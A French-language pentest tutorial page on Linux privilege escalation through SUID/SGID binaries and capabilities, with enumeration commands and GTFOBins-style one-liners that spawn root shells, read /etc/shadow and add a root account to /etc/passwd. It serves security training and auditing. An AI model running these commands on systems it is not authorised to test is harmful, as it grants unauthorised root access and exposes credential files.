# Permissions speciales : SUID, SGID et capabilities

Les permissions speciales constituent l'un des vecteurs d'escalade les plus frequents sur Linux. Un binaire SUID appartenant a root qui execute du code arbitraire, ou une capability mal attribuee, suffisent a obtenir un shell root. Cette page couvre les bits SUID/SGID et les Linux capabilities.

## Pourquoi

Les bits SUID et SGID existent pour permettre a des programmes de s'executer avec les privileges de leur proprietaire plutot que ceux de l'utilisateur qui les lance. C'est un mecanisme legitime (`passwd` a besoin de SUID pour modifier `/etc/shadow`), mais quand des binaires non essentiels portent ces permissions, ils deviennent des vecteurs d'escalade. Les capabilities offrent un controle plus fin que le SUID, mais restent dangereuses si elles sont attribuees sans discernement.

## Comment ca marche

### SUID et SGID

| Permission | Effet |
|---|---|
| **SUID** (`4000`) | Le binaire s'execute avec les privileges de son **proprietaire** (souvent root) |
| **SGID** (`2000`) | Le binaire s'execute avec les privileges du **groupe** proprietaire |
| **Sticky bit** (`1000`) | Sur un repertoire, empeche la suppression de fichiers par un autre utilisateur |

Quand un binaire SUID appartient a root, tout utilisateur qui l'execute obtient temporairement les privileges root pendant l'execution. Si ce binaire permet d'executer des commandes, de lire des fichiers ou de lancer un shell, l'escalade est immediate.

### Linux Capabilities

Les capabilities decomposent les privileges root en unites granulaires. Au lieu de donner un SUID complet, on peut accorder uniquement la capacite necessaire.

| Capability | Effet |
|---|---|
| `cap_setuid` | Permet de changer l'UID du processus (equivalent a `setuid(0)`) |
| `cap_dac_override` | Ignore les permissions de lecture/ecriture sur tous les fichiers |
| `cap_dac_read_search` | Ignore les permissions de lecture et de parcours de repertoires |
| `cap_net_bind_service` | Permet de lier un socket a un port < 1024 |
| `cap_sys_admin` | Capability fourre-tout, quasi-equivalent a root |
| `cap_sys_ptrace` | Permet de tracer les processus d'autres utilisateurs |

{% hint style="warning" %}
`cap_setuid` et `cap_dac_override` sont les capabilities les plus dangereuses. Un binaire avec `cap_setuid` peut changer son UID a 0 et lancer un shell root. Un binaire avec `cap_dac_override` peut lire et ecrire n'importe quel fichier du systeme, y compris `/etc/shadow`.
{% endhint %}

## En pratique

### Trouver les binaires SUID et SGID

```bash
# - Rechercher les binaires SUID
find / -perm -4000 -type f 2>/dev/null

# - Rechercher les binaires SGID
find / -perm -2000 -type f 2>/dev/null

# - Les deux en une seule commande
find / -perm -4000 -o -perm -2000 -type f 2>/dev/null
```

### Exploiter un binaire SUID via GTFOBins

GTFOBins est la reference pour trouver comment exploiter un binaire avec des permissions speciales. Quelques exemples classiques.

{% tabs %}
{% tab title="find" %}
```bash
# - find avec SUID peut executer des commandes
find . -exec /bin/sh -p \;

# Le flag -p preserve les privileges eleves
```
{% endtab %}
{% tab title="vim" %}
```bash
# - vim avec SUID peut lancer un shell
vim -c ':!/bin/sh'

# - Ou lire des fichiers proteges
vim /etc/shadow
```
{% endtab %}
{% tab title="python" %}
```bash
# - python avec SUID
python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```
{% endtab %}
{% tab title="bash" %}
```bash
# - bash avec SUID (flag -p obligatoire)
bash -p

# Sans -p, bash abandonne les privileges eleves
```
{% endtab %}
{% endtabs %}

{% hint style="info" %}
Le site [GTFOBins](https://gtfobins.github.io/) repertorie les exploitations possibles pour des centaines de binaires Unix. Filtrer par `SUID`, `Sudo` ou `Capabilities` selon le contexte.
{% endhint %}

### Enumerer les capabilities

```bash
# - Lister toutes les capabilities sur le systeme
getcap -r / 2>/dev/null

# Resultats typiques :
# /usr/bin/vim.basic = cap_dac_override+eip
# /usr/bin/python3.8 = cap_setuid+ep
# /usr/bin/ping = cap_net_raw+ep
```

### Exploiter cap_setuid

```bash
# - Python avec cap_setuid : elevation immediate
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# - Perl avec cap_setuid
perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'
```

### Exploiter cap_dac_override

```bash
# - vim.basic avec cap_dac_override peut ecrire partout
# Modifier /etc/passwd pour ajouter un utilisateur root
vim.basic /etc/passwd

# Ajouter une ligne :
# hacker:$(openssl passwd -1 password):0:0:root:/root:/bin/bash
```

{% hint style="danger" %}
Modifier `/etc/passwd` ou `/etc/shadow` est risque en production. Toujours faire une sauvegarde avant modification et restaurer apres le test.
{% endhint %}

## Pieges et galeres

- **Flag `-p` oublie** : `bash -p` est necessaire pour conserver les privileges SUID. Sans `-p`, bash abandonne les privileges eleves par defaut. Le meme comportement s'applique a `sh` sur certaines distributions
- **SUID sur des scripts** : Linux ignore le bit SUID sur les scripts interpretes (Bash, Python). Le SUID ne fonctionne que sur les binaires compiles
- **Capabilities et inheritance** : les capabilities ont trois ensembles (effective, permitted, inheritable). Seules les capabilities avec le flag `+ep` (effective + permitted) sont directement exploitables
- **Binaires SUID legitimes** : `passwd`, `su`, `mount`, `ping` sont normalement SUID. Se concentrer sur les binaires inhabituels : editeurs de texte, langages de script, outils systeme non standards
- **Namespaces et containers** : dans un conteneur, les binaires SUID peuvent etre presents mais ne pas fonctionner comme attendu en raison de l'isolation des namespaces

## Memo express

| Commande | Usage |
|---|---|
| `find / -perm -4000 2>/dev/null` | Lister les binaires SUID |
| `find / -perm -2000 2>/dev/null` | Lister les binaires SGID |
| `getcap -r / 2>/dev/null` | Lister les capabilities |
| `bash -p` | Shell avec privileges SUID preserves |
| `find . -exec /bin/sh -p \;` | Escalade via find SUID |
| `python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'` | Escalade via cap_setuid |
| `vim.basic /etc/shadow` | Lecture avec cap_dac_override |
| GTFOBins | Reference pour l'exploitation de binaires |

***
